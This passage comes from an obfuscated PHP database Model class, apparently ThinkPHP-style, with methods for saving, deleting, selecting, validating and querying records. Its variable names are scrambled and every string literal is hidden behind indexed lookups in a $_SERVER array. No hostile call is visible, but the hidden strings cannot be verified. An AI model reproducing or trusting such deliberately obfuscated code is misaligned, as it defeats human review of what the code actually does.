$Œ÷õ‰¨Ì))) { $this->error = think_lang($ø—»–¼[335]); return !1; } else { return $¿‡†ÓÄÌ; } } public function save($û ‘½·ã = '', $–¦Ì¼å« = array()) { $àŠÖ‹¢» =& $_SERVER[÷åé¼î]; if (empty($û ‘½·ã)) { if (!empty($this->data)) { $û ‘½·ã = $this->data; $this->data = array(); } else { $this->error = think_lang($àŠÖ‹¢»[332]); return !1; } } $û ‘½·ã = $this->_facade($û ‘½·ã); $–¦Ì¼å« = $this->_parseOptions($–¦Ì¼å«); $––Ø™ü = $this->getPk(); if (!isset($–¦Ì¼å«[$àŠÖ‹¢»[336]])) { if (isset($û ‘½·ã[$––Ø™ü])) { $ŒÃ¡’òœ[$––Ø™ü] = $û ‘½·ã[$––Ø™ü]; $–¦Ì¼å«[$àŠÖ‹¢»[336]] = $ŒÃ¡’òœ; unset($û ‘½·ã[$––Ø™ü]); } else { $this->error = think_lang($àŠÖ‹¢»[335]); return !1; } } if (is_array($–¦Ì¼å«[$àŠÖ‹¢»[336]]) && isset($–¦Ì¼å«[$àŠÖ‹¢»[336]][$––Ø™ü])) { $ˆÀ‹Ü— = $–¦Ì¼å«[$àŠÖ‹¢»[336]][$––Ø™ü]; } if (!1 === $this->_beforeUpdate($û ‘½·ã, $–¦Ì¼å«)) { return !1; } $ÛÍğ°á· = $this->db->update($û ‘½·ã, $–¦Ì¼å«); if (!1 !== $ÛÍğ°á·) { if (isset($ˆÀ‹Ü—)) { $û ‘½·ã[$––Ø™ü] = $ˆÀ‹Ü—; } $this->_afterUpdate($û ‘½·ã, $–¦Ì¼å«); } return $ÛÍğ°á·; } protected function _beforeUpdate(&$õº£˜–, $½²’°¾ù) { } protected function _afterUpdate($¦è±Ÿ°–, $‚¾¬°‡Ë) { } public function delete($Ì’â¿¨Ä = array()) { $‹ûæï¾¦ =& $_SERVER[÷åé¼î]; if (empty($Ì’â¿¨Ä) && empty($this->options[$‹ûæï¾¦[336]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $ñ„¨´· = $this->getPk(); if (is_numeric($Ì’â¿¨Ä) || is_string($Ì’â¿¨Ä)) { if (strpos($Ì’â¿¨Ä, $‹ûæï¾¦[50])) { $Ğº½Æ®¼[$ñ„¨´·] = array($‹ûæï¾¦[337], $Ì’â¿¨Ä); } else { $Ğº½Æ®¼[$ñ„¨´·] = $Ì’â¿¨Ä; } $this->options[$‹ûæï¾¦[336]] = $Ğº½Æ®¼; } $Ì’â¿¨Ä = $this->_parseOptions(); if (is_array($Ì’â¿¨Ä[$‹ûæï¾¦[336]]) && isset($Ì’â¿¨Ä[$‹ûæï¾¦[336]][$ñ„¨´·])) { $¦Ò¬ä¼œ = $Ì’â¿¨Ä[$‹ûæï¾¦[336]][$ñ„¨´·]; } $”Ûîœû¯ = $this->db->delete($Ì’â¿¨Ä); if (!1 !== $”Ûîœû¯) { $¥‹º›ÒÂ = array(); if (isset($¦Ò¬ä¼œ)) { $¥‹º›ÒÂ[$ñ„¨´·] = $¦Ò¬ä¼œ; } $this->_after_delete($¥‹º›ÒÂ, $Ì’â¿¨Ä); } return $”Ûîœû¯; } protected function _after_delete($¨–’ú˜ª, $î˜€æ†) { } public function select($ƒœ“³úá = array()) { $Ô„º¤ıâ =& $_SERVER[÷åé¼î]; if (is_string($ƒœ“³úá) || is_numeric($ƒœ“³úá)) { $ï›éèº = $this->getPk(); if (strpos($ƒœ“³úá, $Ô„º¤ıâ[50])) { $«áš³Œ[$ï›éèº] = array($Ô„º¤ıâ[337], $ƒœ“³úá); } else { $«áš³Œ[$ï›éèº] = $ƒœ“³úá; } $this->options[$Ô„º¤ıâ[336]] = $«áš³Œ; } elseif (!1 === $ƒœ“³úá) { $ƒœ“³úá = $this->_parseOptions(); return $Ô„º¤ıâ[338] . $this->db->buildSelectSql($ƒœ“³úá) . $Ô„º¤ıâ[339]; } $ƒœ“³úá = $this->_parseOptions(); $¿•‰„ = $this->db->select($ƒœ“³úá); if (!1 === $¿•‰„) { return !1; } if (empty($¿•‰„)) { return null; } $this->_afterSelect($¿•‰„, $ƒœ“³úá); return $¿•‰„; } protected function _afterSelect(&$‡Œµ ×à, $«„ûÒÁ) { } public function buildSql($Û¼ê×‡Ò = array()) { $Ü‹´ÅÒ =& $_SERVER[÷åé¼î]; $Û¼ê×‡Ò = $this->_parseOptions($Û¼ê×‡Ò); return $Ü‹´ÅÒ[338] . $this->db->buildSelectSql($Û¼ê×‡Ò) . $Ü‹´ÅÒ[339]; } public function optionsValue($«ªäÊõÖ = null) { if (is_null($«ªäÊõÖ)) { return $this->options; } elseif (is_array($«ªäÊõÖ)) { $this->options = array_merge($this->options, $«ªäÊõÖ); } } protected function _parseOptions($»ÙîÓÊì = array()) { $–úÄ§¡‚ =& $_SERVER[÷åé¼î]; if (is_array($»ÙîÓÊì)) { $»ÙîÓÊì = array_merge($this->options, $»ÙîÓÊì); } $this->options = array(); if (!isset($»ÙîÓÊì[$–úÄ§¡‚[340]])) { $»ÙîÓÊì[$–úÄ§¡‚[340]] = $this->getTableName(); $Ş‡É¨¬‹ = $this->fields; } else { $Ş‡É¨¬‹ = $this->getDbFields(); } if (!empty($»ÙîÓÊì[$–úÄ§¡‚[341]])) { $»ÙîÓÊì[$–úÄ§¡‚[340]] .= $–úÄ§¡‚[53] . $»ÙîÓÊì[$–úÄ§¡‚[341]]; } $»ÙîÓÊì[$–úÄ§¡‚[342]] = $this->name; if (isset($»ÙîÓÊì[$–úÄ§¡‚[336]]) && is_array($»ÙîÓÊì[$–úÄ§¡‚[336]]) && !empty($Ş‡É¨¬‹) && !isset($»ÙîÓÊì[$–úÄ§¡‚[343]]) && !isset($»ÙîÓÊì[$–úÄ§¡‚[340]])) { foreach ($»ÙîÓÊì[$–úÄ§¡‚[336]] as $Èªî°İğ => $Ï—İ×¹) { $Èªî°İğ = trim($Èªî°İğ); if (in_array($Èªî°İğ, $Ş‡É¨¬‹, !0)) { if (is_scalar($Ï—İ×¹)) { $this->_parseType($»ÙîÓÊì[$–úÄ§¡‚[336]], $Èªî°İğ); } } elseif (!is_numeric($Èªî°İğ) && $–úÄ§¡‚[11] != substr($Èªî°İğ, 0, 1) && !1 === strpos($Èªî°İğ, $–úÄ§¡‚[10]) && !1 === strpos($Èªî°İğ, $–úÄ§¡‚[321]) && !1 === strpos($Èªî°İğ, $–úÄ§¡‚[214]) && !1 === strpos($Èªî°İğ, $–úÄ§¡‚[344])) { unset($»ÙîÓÊì[$–úÄ§¡‚[336]][$Èªî°İğ]); } } } $this->_options_filter($»ÙîÓÊì); return $»ÙîÓÊì; } protected function _options_filter(&$ÎÈÁÃ­ç) { } protected function _parseType(&$Ó™Æ«ÅÛ, $²•Ó†­Õ) { $ú‡¼´ÍÑ =& $_SERVER[÷åé¼î]; if (empty($this->options[$ú‡¼´ÍÑ[345]][$ú‡¼´ÍÑ[4] . $²•Ó†­Õ])) { $½È¸Œ¡‹ = strtolower($this->fields[$ú‡¼´ÍÑ[313]][$²•Ó†­Õ]); if (!1 !== strpos($½È¸Œ¡‹, $ú‡¼´ÍÑ[346])) { } elseif (!1 === strpos($½È¸Œ¡‹, $ú‡¼´ÍÑ[347]) && !1 !== strpos($½È¸Œ¡‹, $ú‡¼´ÍÑ[348])) { $Ó™Æ«ÅÛ[$²•Ó†­Õ] = intval($Ó™Æ«ÅÛ[$²•Ó†­Õ]); } elseif (!1 !== strpos($½È¸Œ¡‹, $ú‡¼´ÍÑ[349]) || !1 !== strpos($½È¸Œ¡‹, $ú‡¼´ÍÑ[350])) { $Ó™Æ«ÅÛ[$²•Ó†­Õ] = floatval($Ó™Æ«ÅÛ[$²•Ó†­Õ]); } elseif (!1 !== strpos($½È¸Œ¡‹, $ú‡¼´ÍÑ[351])) { $Ó™Æ«ÅÛ[$²•Ó†­Õ] = (bool) $Ó™Æ«ÅÛ[$²•Ó†­Õ]; } } } public function find($¥¾›üÊ = array()) { $¥—ù¾ =& $_SERVER[÷åé¼î]; if (is_numeric($¥¾›üÊ) || is_string($¥¾›üÊ)) { $Ê¹ÃïŠ–[$this->getPk()] = intval($¥¾›üÊ); $this->options[$¥—ù¾[336]] = $Ê¹ÃïŠ–; } $this->options[$¥—ù¾[352]] = 1; $¥¾›üÊ = $this->_parseOptions(); $…ÃŒËüí = $this->db->select($¥¾›üÊ); if (!1 === $…ÃŒËüí) { return !1; } if (empty($…ÃŒËüí)) { return null; } $this->data = $…ÃŒËüí[0]; $this->_afterFind($this->data, $¥¾›üÊ); if (!empty($this->options[$¥—ù¾[353]])) { return $this->returnResult($this->data, $this->options[$¥—ù¾[353]]); } return $this->data; } protected function _afterFind(&$éÕê–É×, $—ôŞø¹ñ) { } protected function returnResult($¡³±õ´ç, $ò×Ï³ = '') { $“òşàÑ =& $_SERVER[÷åé¼î]; if ($ò×Ï³) { if (is_callable($ò×Ï³)) { return call_user_func($ò×Ï³, $¡³±õ´ç); } switch (strtolower($ò×Ï³)) { case $“òşàÑ[354]: return json_encode($¡³±õ´ç); case $“òşàÑ[355]: return xml_encode($¡³±õ´ç); } } return $¡³±õ´ç; } public function parseFieldsMap($ÔĞ«Ó€ú, $¸¸§šï = 1) { if (!empty($this->_map)) { foreach ($this->_map as $ì¤«Æ¥¡ => $ç‰Ê£æî) { if ($¸¸§šï == 1) { if (isset($ÔĞ«Ó€ú[$ç‰Ê£æî])) { $ÔĞ«Ó€ú[$ì¤«Æ¥¡] = $ÔĞ«Ó€ú[$ç‰Ê£æî]; unset($ÔĞ«Ó€ú[$ç‰Ê£æî]); } } else { if (isset($ÔĞ«Ó€ú[$ì¤«Æ¥¡])) { $ÔĞ«Ó€ú[$ç‰Ê£æî] = $ÔĞ«Ó€ú[$ì¤«Æ¥¡]; unset($ÔĞ«Ó€ú[$ì¤«Æ¥¡]); } } } } return $ÔĞ«Ó€ú; } public function setField($«Àûêä, $ÎÉĞÇ¶Ê = '') { if (is_array($«Àûêä)) { $ûŸ†±é = $«Àûêä; } else { $ûŸ†±é[$«Àûêä] = $ÎÉĞÇ¶Ê; } return $this->save($ûŸ†±é); } public function setAdd($ŸÍàú‰, $¡•ØÛ = 1) { $äı©‰›¥ =& $_SERVER[÷åé¼î]; $Úì°Œ´Ú = $ŸÍàú‰ . $äı©‰›¥[356] . $¡•ØÛ; if ($¡•ØÛ < 0) { $Úì°Œ´Ú = $ŸÍàú‰ . $¡•ØÛ; } return $this->setField($ŸÍàú‰, array($äı©‰›¥[357], $Úì°Œ´Ú)); } public function getField($ËœÜã , $ó×Æà©³ = null) { $û•îïÌš =& $_SERVER[÷åé¼î]; $ÏÄÏªÒ”[$û•îïÌš[334]] = $ËœÜã ; $ÏÄÏªÒ” = $this->_parseOptions($ÏÄÏªÒ”); $ËœÜã  = trim($ËœÜã ); if (strpos($ËœÜã , $û•îïÌš[50])) { if (!isset($ÏÄÏªÒ”[$û•îïÌš[352]])) { $ÏÄÏªÒ”[$û•îïÌš[352]] = is_numeric($ó×Æà©³) ? $ó×Æà©³ : $û•îïÌš[12]; } $ø—åïŸœ = $this->db->select($ÏÄÏªÒ”); if (!empty($ø—åïŸœ)) { $‡ôÑä¾ = explode($û•îïÌš[50], $ËœÜã ); $ËœÜã  = array_keys($ø—åïŸœ[0]); $à¶°ş°Å = array_shift($ËœÜã ); $ÚÑôø·Å = array_shift($ËœÜã ); $Ô—‚’ùš = array(); $­´­ß× = count($‡ôÑä¾); foreach ($ø—åïŸœ as $Åã„ÜÅŸ) { $üÙ»Å÷ = $Åã„ÜÅŸ[$à¶°ş°Å]; if (2 == $­´­ß×) { $Ô—‚’ùš[$üÙ»Å÷] = $Åã„ÜÅŸ[$ÚÑôø·Å]; } else { $Ô—‚’ùš[$üÙ»Å÷] = is_string($ó×Æà©³) ? implode($ó×Æà©³, $Åã„ÜÅŸ) : $Åã„ÜÅŸ; } } return $Ô—‚’ùš; } } else { if (!0 !== $ó×Æà©³) { $ÏÄÏªÒ”[$û•îïÌš[352]] = is_numeric($ó×Æà©³) ? $ó×Æà©³ : 1; } if ($ó×Æà©³ === $û•îïÌš[316]) { unset($ÏÄÏªÒ”[$û•îïÌš[352]]); } $Åã„ÜÅŸ = $this->db->select($ÏÄÏªÒ”); if (!empty($Åã„ÜÅŸ)) { if ($ó×Æà©³ === $û•îïÌš[316]) { return reset($Åã„ÜÅŸ[0]); } if (!0 !== $ó×Æà©³ && 1 == $ÏÄÏªÒ”[$û•îïÌš[352]]) { return reset($Åã„ÜÅŸ[0]); } foreach ($Åã„ÜÅŸ as $—…êô) { $°ÎËÓ[] = $—…êô[$ËœÜã ]; } return $°ÎËÓ; } } return null; } public function create($°Ì»Çù = '', $ØèŞÚ± = '') { $üŠÁË³î =& $_SERVER[÷åé¼î]; if (empty($°Ì»Çù)) { $°Ì»Çù = $_POST; } elseif (is_object($°Ì»Çù)) { $°Ì»Çù = get_object_vars($°Ì»Çù); } if (empty($°Ì»Çù) || !is_array($°Ì»Çù)) { $this->error = think_lang($üŠÁË³î[332]); return !1; } $°Ì»Çù = $this->parseFieldsMap($°Ì»Çù, 0); $ØèŞÚ± = $ØèŞÚ± ? $ØèŞÚ± : (!empty($°Ì»Çù[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$üŠÁË³î[334]])) { $¶–ØÜ…» = $this->options[$üŠÁË³î[334]]; unset($this->options[$üŠÁË³î[334]]); } elseif ($ØèŞÚ± == THINK_MODEL_INSERT && isset($this->insertFields)) { $¶–ØÜ…» = $this->insertFields; } elseif ($ØèŞÚ± == THINK_MODEL_UPDATE && isset($this->updateFields)) { $¶–ØÜ…» = $this->updateFields; } if (isset($¶–ØÜ…»)) { if (is_string($¶–ØÜ…»)) { $¶–ØÜ…» = explode($üŠÁË³î[50], $¶–ØÜ…»); } if (think_config($üŠÁË³î[358])) { $¶–ØÜ…»[] = think_config($üŠÁË³î[359]); } foreach ($°Ì»Çù as $ïûİŞÑØ => $Ã—Êõãú) { if (!in_array($ïûİŞÑØ, $¶–ØÜ…»)) { unset($°Ì»Çù[$ïûİŞÑØ]); } } } if (!$this->autoValidation($°Ì»Çù, $ØèŞÚ±)) { return !1; } if (!$this->autoCheckToken($°Ì»Çù)) { $this->error = think_lang($üŠÁË³î[360]); return !1; } if ($this->autoCheckFields) { $¶–ØÜ…» = $this->getDbFields(); foreach ($°Ì»Çù as $ïûİŞÑØ => $Ã—Êõãú) { if (!in_array($ïûİŞÑØ, $¶–ØÜ…»)) { unset($°Ì»Çù[$ïûİŞÑØ]); } elseif (MAGIC_QUOTES_GPC && is_string($Ã—Êõãú)) { $°Ì»Çù[$ïûİŞÑØ] = stripslashes($Ã—Êõãú); } } } $this->autoOperation($°Ì»Çù, $ØèŞÚ±); $this->data = $°Ì»Çù; return $°Ì»Çù; } public function autoCheckToken($ÄÙ´òñ) { $·¯®˜Ü =& $_SERVER[÷åé¼î]; if (isset($this->options[$·¯®˜Ü[361]]) && !$this->options[$·¯®˜Ü[361]]) { return !0; } if (think_config($·¯®˜Ü[358])) { $Ù›Á„”ú = think_config($·¯®˜Ü[359]); if (!isset($ÄÙ´òñ[$Ù›Á„”ú]) || Session::get($Ù›Á„”ú)) { return !1; } list($ù¢–¤½’, $úİˆÕ») = explode($·¯®˜Ü[11], $ÄÙ´òñ[$Ù›Á„”ú]); if ($úİˆÕ» && Session::get($Ù›Á„”ú . $·¯®˜Ü[10] . $ù¢–¤½’) === $úİˆÕ») { Session::remove($Ù›Á„”ú . $·¯®˜Ü[10] . $ù¢–¤½’); return !0; } if (think_config($·¯®˜Ü[362])) { Session::remove($Ù›Á„”ú . $·¯®˜Ü[10] . $ù¢–¤½’); } return !1; } return !0; } public function regex($ö·“Çõ±, $­Ö—ÅŠ) { $ÌßÜ¡ =& $_SERVER[÷åé¼î]; $³Üî½å» = array($ÌßÜ¡[363] => $ÌßÜ¡[364], $ÌßÜ¡[365] => $ÌßÜ¡[366], $ÌßÜ¡[367] => $ÌßÜ¡[368], $ÌßÜ¡[369] => $ÌßÜ¡[370], $ÌßÜ¡[371] => $ÌßÜ¡[372], $ÌßÜ¡[373] => $ÌßÜ¡[374], $ÌßÜ¡[375] => $ÌßÜ¡[376], $ÌßÜ¡[350] => $ÌßÜ¡[377], $ÌßÜ¡[378] => $ÌßÜ¡[379]); if (isset($³Üî½å»[strtolower($­Ö—ÅŠ)])) { $­Ö—ÅŠ = $³Üî½å»[strtolower($­Ö—ÅŠ)]; } return preg_match($­Ö—ÅŠ, $ö·“Çõ±) === 1; } private function autoOperation(&$·¤‡±›, $çğ­ìùÁ) { $»È½ÍĞó =& $_SERVER[÷åé¼î]; if (!empty($this->options[$»È½ÍĞó[380]])) { $äÚ¦ßº = $this->options[$»È½ÍĞó[380]]; unset($this->options[$»È½ÍĞó[380]]); } elseif (!empty($this->_auto)) { $äÚ¦ßº = $this->_auto; } if (isset($äÚ¦ßº)) { foreach ($äÚ¦ßº as $ıèâ»ì) { if (empty($ıèâ»ì[2])) { $ıèâ»ì[2] = THINK_MODEL_INSERT; } if ($çğ­ìùÁ == $ıèâ»ì[2] || $ıèâ»ì[2] == THINK_MODEL_BOTH) { switch (trim($ıèâ»ì[3])) { case $»È½ÍĞó[381]: case $»È½ÍĞó[382]: $œğ¾ó…æ = isset($ıèâ»ì[4]) ? (array) $ıèâ»ì[4] : array(); if (isset($·¤‡±›[$ıèâ»ì[0]])) { array_unshift($œğ¾ó…æ, $·¤‡±›[$ıèâ»ì[0]]); } if ($»È½ÍĞó[381] == $ıèâ»ì[3]) { $·¤‡±›[$ıèâ»ì[0]] = call_user_func_array($ıèâ»ì[1], $œğ¾ó…æ); } else { $·¤‡±›[$ıèâ»ì[0]] = call_user_func_array(array(&$this, $ıèâ»ì[1]), $œğ¾ó…æ); } break; case $»È½ÍĞó[334]: $·¤‡±›[$ıèâ»ì[0]] = $·¤‡±›[$ıèâ»ì[1]]; break; case $»È½ÍĞó[383]: if ($»È½ÍĞó[12] === $·¤‡±›[$ıèâ»ì[0]]) { unset($·¤‡±›[$ıèâ»ì[0]]); } break; case $»È½ÍĞó[384]: default: $·¤‡±›[$ıèâ»ì[0]] = $ıèâ»ì[1]; } if (!1 === $·¤‡±›[$ıèâ»ì[0]]) { unset($·¤‡±›[$ıèâ»ì[0]]); } } } } return $·¤‡±›; } protected function autoValidation($›Şõ¶º, $©®í„Û) { $˜·š¨·Ì =& $_SERVER[÷åé¼î]; if (!empty($this->options[$˜·š¨·Ì[385]])) { $²ôëİ˜ï = $this->options[$˜·š¨·Ì[385]]; unset($this->options[$˜·š¨·Ì[385]]); } elseif (!empty($this->_validate)) { $²ôëİ˜ï = $this->_validate; } if (isset($²ôëİ˜ï)) { if ($this->patchValidate) { $this->error = array(); } foreach ($²ôëİ˜ï as $»ÈÎÊİï => $óô÷é›) { if (empty($óô÷é›[5]) || $óô÷é›[5] == THINK_MODEL_BOTH || $óô÷é›[5] == $©®í„Û) { if (0 == strpos($óô÷é›[2], $˜·š¨·Ì[386]) && strpos($óô÷é›[2], $˜·š¨·Ì[387])) { $óô÷é›[2] = think_lang(substr($óô÷é›[2], 2, -1)); } $óô÷é›[3] = isset($óô÷é›[3]) ? $óô÷é›[3] : THINK_EXISTS_VALIDATE; $óô÷é›[4] = isset($óô÷é›[4]) ? $óô÷é›[4] : $˜·š¨·Ì[388]; switch ($óô÷é›[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($›Şõ¶º, $óô÷é›)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($˜·š¨·Ì[12] != trim($›Şõ¶º[$óô÷é›[0]])) { if (!1 === $this->_validationField($›Şõ¶º, $óô÷é›)) { return !1; } } break; default: if (isset($›Şõ¶º[$óô÷é›[0]])) { if (!1 === $this->_validationField($›Şõ¶º, $óô÷é›)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($¯ˆ ƒ­©, $–âİŞ¸Ü) { if (!1 === $this->_validationFieldItem($¯ˆ ƒ­©, $–âİŞ¸Ü)) { if ($this->patchValidate) { $this->error[$–âİŞ¸Ü[0]] = $–âİŞ¸Ü[2]; } else { $this->error = $–âİŞ¸Ü[2]; return !1; } } return; } protected function _validationFieldItem($ëæ©Âœƒ, $ç¦é€§Ø) { $¡Ñ„¡é =& $_SERVER[÷åé¼î]; switch (strtolower(trim($ç¦é€§Ø[4]))) { case $¡Ñ„¡é[381]: case $¡Ñ„¡é[382]: $…¡ş™„Û = isset($ç¦é€§Ø[6]) ? (array) $ç¦é€§Ø[6] : array(); if (is_string($ç¦é€§Ø[0]) && strpos($ç¦é€§Ø[0], $¡Ñ„¡é[50])) { $ç¦é€§Ø[0] = explode($¡Ñ„¡é[50], $ç¦é€§Ø[0]); } if (is_array($ç¦é€§Ø[0])) { foreach ($ç¦é€§Ø[0] as $¶ƒ‰®¨) { $•˜÷ ê[$¶ƒ‰®¨] = $ëæ©Âœƒ[$¶ƒ‰®¨]; } array_unshift($…¡ş™„Û, $•˜÷ ê); } else { array_unshift($…¡ş™„Û, $ëæ©Âœƒ[$ç¦é€§Ø[0]]); } if ($¡Ñ„¡é[381] == $ç¦é€§Ø[4]) { return call_user_func_array($ç¦é€§Ø[1], $…¡ş™„Û); } else { return call_user_func_array(array(&$this, $ç¦é€§Ø[1]), $…¡ş™„Û); } case $¡Ñ„¡é[389]: return $ëæ©Âœƒ[$ç¦é€§Ø[0]] == $ëæ©Âœƒ[$ç¦é€§Ø[1]]; case $¡Ñ„¡é[390]: if (is_string($ç¦é€§Ø[0]) && strpos($ç¦é€§Ø[0], $¡Ñ„¡é[50])) { $ç¦é€§Ø[0] = explode($¡Ñ„¡é[50], $ç¦é€§Ø[0]); } $¦§‹Ğ€ = array(); if (is_array($ç¦é€§Ø[0])) { foreach ($ç¦é€§Ø[0] as $¶ƒ‰®¨) { $¦§‹Ğ€[$¶ƒ‰®¨] = $ëæ©Âœƒ[$¶ƒ‰®¨]; } } else { $¦§‹Ğ€[$ç¦é€§Ø[0]] = $ëæ©Âœƒ[$ç¦é€§Ø[0]]; } if (!empty($ëæ©Âœƒ[$this->getPk()])) { $¦§‹Ğ€[$this->getPk()] = array($¡Ñ„¡é[391], $ëæ©Âœƒ[$this->getPk()]); } if ($this->where($¦§‹Ğ€)->find()) { return !1; } return !0; default: return $this->check($ëæ©Âœƒ[$ç¦é€§Ø[0]], $ç¦é€§Ø[1], $ç¦é€§Ø[4]); } } public function check($Å§ğ¢ƒë, $ÓÃë÷ê, $›®˜‰‰¼ = "\x72\145\x67\145\x78") { $Ùİ¿ß… =& $_SERVER[÷åé¼î]; $›®˜‰‰¼ = strtolower(trim($›®˜‰‰¼)); switch ($›®˜‰‰¼) { case $Ùİ¿ß…[7]: case $Ùİ¿ß…[392]: $Æ¿Ò·…Î = is_array($ÓÃë÷ê) ? $ÓÃë÷ê : explode($Ùİ¿ß…[50], $ÓÃë÷ê); return $›®˜‰‰¼ == $Ùİ¿ß…[7] ? in_array($Å§ğ¢ƒë, $Æ¿Ò·…Î) : !in_array($Å§ğ¢ƒë, $Æ¿Ò·…Î); case $Ùİ¿ß…[393]: case $Ùİ¿ß…[394]: if (is_array($ÓÃë÷ê)) { $§İ™Š» = $ÓÃë÷ê[0]; $´êÒ«ó” = $ÓÃë÷ê[1]; } else { list($§İ™Š», $´êÒ«ó”) = explode($Ùİ¿ß…[50], $ÓÃë÷ê); } return $›®˜‰‰¼ == $Ùİ¿ß…[393] ? $Å§ğ¢ƒë >= $§İ™Š» && $Å§ğ¢ƒë <= $´êÒ«ó” : $Å§ğ¢ƒë < $§İ™Š» || $Å§ğ¢ƒë > $´êÒ«ó”; case $Ùİ¿ß…[395]: case $Ùİ¿ß…[396]: return $›®˜‰‰¼ == $Ùİ¿ß…[395] ? $Å§ğ¢ƒë == $ÓÃë÷ê : $Å§ğ¢ƒë != $ÓÃë÷ê; case $Ùİ¿ß…[397]: $Â°¸°²Ä = mb_strlen($Å§ğ¢ƒë, $Ùİ¿ß…[398]); if (strpos($ÓÃë÷ê, $Ùİ¿ß…[50])) { list($§İ™Š», $´êÒ«ó”) = explode($Ùİ¿ß…[50], $ÓÃë÷ê); return $Â°¸°²Ä >= $§İ™Š» && $Â°¸°²Ä <= $´êÒ«ó”; } else { return $Â°¸°²Ä == $ÓÃë÷ê; } case $Ùİ¿ß…[399]: list($Ê‰òÈ»î, $Ñ‘Àï› ) = explode($Ùİ¿ß…[50], $ÓÃë÷ê); if (!is_numeric($Ê‰òÈ»î)) { $Ê‰òÈ»î = strtotime($Ê‰òÈ»î); } if (!is_numeric($Ñ‘Àï› )) { $Ñ‘Àï›  = strtotime($Ñ‘Àï› ); } return NOW_TIME >= $Ê‰òÈ»î && NOW_TIME <= $Ñ‘Àï› ; case $Ùİ¿ß…[400]: return in_array(get_client_ip(), explode($Ùİ¿ß…[50], $ÓÃë÷ê)); case $Ùİ¿ß…[401]: return !in_array(get_client_ip(), explode($Ùİ¿ß…[50], $ÓÃë÷ê)); case $Ùİ¿ß…[388]: default: return $this->regex($Å§ğ¢ƒë, $ÓÃë÷ê); } } public function query($Åôâíª®, $õ„÷æ§ = false) { $¾òÆÙâí =& $_SERVER[÷åé¼î]; if (!is_bool($õ„÷æ§) && !is_array($õ„÷æ§)) { $õ„÷æ§ = func_get_args(); array_shift($õ„÷æ§); } $Åôâíª® = str_replace(array($¾òÆÙâí[262], $¾òÆÙâí[402]), $¾òÆÙâí[53], $Åôâíª®); $Åôâíª® = $this->parseSql($Åôâíª®, $õ„÷æ§); return $this->db->query($Åôâíª®); } public function execute($à”²”Ø¸, $‹àšÁ”Ô = false) { if (!is_bool($‹àšÁ”Ô) && !is_array($‹àšÁ”Ô)) { $‹àšÁ”Ô = func_get_args(); array_shift($‹àšÁ”Ô); } $à”²”Ø¸ = $this->parseSql($à”²”Ø¸, $‹àšÁ”Ô); return $this->db->execute($à”²”Ø¸); } protected function parseSql($¤½ÖóÇ, $ÖÉĞ´‹¤) { $´³´–² =& $_SERVER[÷åé¼î]; if (!0 === $ÖÉĞ´‹¤) { $¤­º¯ò‚ = $this->_parseOptions(); $¤½ÖóÇ = $this->db->parseSql($¤½ÖóÇ, $¤­º¯ò‚); } elseif (is_array($ÖÉĞ´‹¤)) { $ÖÉĞ´‹¤ = array_map(array($this->db, $´³´–²[403]), $ÖÉĞ´‹¤); $¤½ÖóÇ = vsprintf($¤½ÖóÇ, $ÖÉĞ´‹¤); } else { $¤½ÖóÇ = strtr($¤½ÖóÇ, array($´³´–²[404] => $this->getTableName(), $´³´–²[405] => think_config($´³´–²[305]))); } $this->db->setModel($this->name); return $¤½ÖóÇ; } public function db($¶‘ÍÎÔ· = '', $Ö‡‘×îÖ = '', $¬Óå¥óû = array()) { $½Ë¡€ˆÄ =& $_SERVER[÷åé¼î]; if ($½Ë¡€ˆÄ[12] === $¶‘ÍÎÔ· && $this->db) { return $this->db; } static $—ù±”± = array(); static $ù•ïŒÃ = array(); if (!isset($ù•ïŒÃ[$¶‘ÍÎÔ·]) || isset($ù•ïŒÃ[$¶‘ÍÎÔ·]) && $Ö‡‘×îÖ && $—ù±”±[$¶‘ÍÎÔ·] != $Ö‡‘×îÖ) { if (!empty($Ö‡‘×îÖ) && is_string($Ö‡‘×îÖ) && !1 === strpos($Ö‡‘×îÖ, $½Ë¡€ˆÄ[8])) { $Ö‡‘×îÖ = think_config($Ö‡‘×îÖ); } $¶‘ÍÎÔ· = think_guid($Ö‡‘×îÖ); $ù•ïŒÃ[$¶‘ÍÎÔ·] = Db::getInstance($Ö‡‘×îÖ); } elseif (NULL === $Ö‡‘×îÖ) { $ù•ïŒÃ[$¶‘ÍÎÔ·]->close(); unset($ù•ïŒÃ[$¶‘ÍÎÔ·]); return; } if (!empty($¬Óå¥óû)) { if (is_string($¬Óå¥óû)) { parse_str($¬Óå¥óû, $¬Óå¥óû); } foreach ($¬Óå¥óû as $¼¾É«º => $Ù¤®°¸) { $this->setProperty($¼¾É«º, $Ù¤®°¸); } } $—ù±”±[$¶‘ÍÎÔ·] = $Ö‡‘×îÖ; $this->db = $ù•ïŒÃ[$¶‘ÍÎÔ·]; $this->_after_db(); if (!empty($this->name) && $this->autoCheckFields) { $this->_checkTableInfo(); } return $this; } protected function _after_db() { } public function getModelName() { if (empty($this->name)) { $‹‡èù£· = get_class($this); if ($‹‡èù£· == $_SERVER[÷åé¼î][406]) { return $this->name; } $this->name = substr($‹‡èù£·, 0, -5); } return $this->name; } public function getTableName() { $ãÎ˜°Ñ =& $_SERVER[÷åé¼î]; if (empty($this->trueTableName)) { $á¿¶éú² = !empty($this->tablePrefix) ? $this->tablePrefix : $ãÎ˜°Ñ[12]; if (!empty($this->tableName)) { $á¿¶éú² .= $this->tableName; } else { $á¿¶éú² .= think_parse_name($this->name); } $this->trueTableName = strtolower($á¿¶éú²); } return (!empty($this->dbName) ? $this->dbName . $ãÎ˜°Ñ[10] : $ãÎ˜°Ñ[12]) . $this->trueTableName; } public function startTrans() { $this->commit(); $this->db->startTrans(); return; } public function commit() { return $this->db->commit(); } public function rollback() { return $this->db->rollback(); } public function getError() { return $this->error; } public function getDbError() { return $this->db->getError(); } public function getLastInsID() { return $this->db->getLastInsID(); } public function getLastSql() { return $this->db->getLastSql($this->name); } public function _sql() { return $this->getLastSql(); } public function getPk() { $ÓİÛŒ¸ƒ =& $_SERVER[÷åé¼î]; return isset($this->fields[$ÓİÛŒ¸ƒ[312]]) ? $this->fields[$ÓİÛŒ¸ƒ[312]] : $this->pk; } public function getDbFields() { $‘Èáö’ =& $_SERVER[÷åé¼î]; if (isset($this->options[$‘Èáö’[340]])) { 